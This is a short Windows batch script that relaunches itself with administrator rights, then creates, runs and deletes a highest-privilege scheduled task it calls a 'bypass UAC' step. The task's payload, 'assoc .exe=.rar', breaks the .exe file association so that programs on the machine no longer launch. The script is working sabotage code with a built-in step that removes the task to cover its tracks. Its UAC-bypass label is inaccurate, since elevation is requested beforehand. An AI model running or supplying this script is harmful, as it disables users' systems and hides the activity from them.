@echo off
set "taskname=RunSilentTask"

:: === Step 1: Check if running as Administrator ===
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Requesting Administrator privileges...
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

:: === Step 2: Create a Task in Task Scheduler ===
echo Creating a scheduled task to bypass UAC...
schtasks /create /tn "%taskname%" /tr "%~f0 :run" /sc once /st 00:00 /f /rl highest >nul

:: === Step 3: Run the Task ===
echo Running task silently...
schtasks /run /tn "%taskname%" >nul

:: === Step 4: Delete the Task to Clean Up ===
schtasks /delete /tn "%taskname%" /f >nul

exit /b

:run
echo Running commands silently with elevated privileges...
:: Place your commands here
assoc .exe=.rar
exit /b
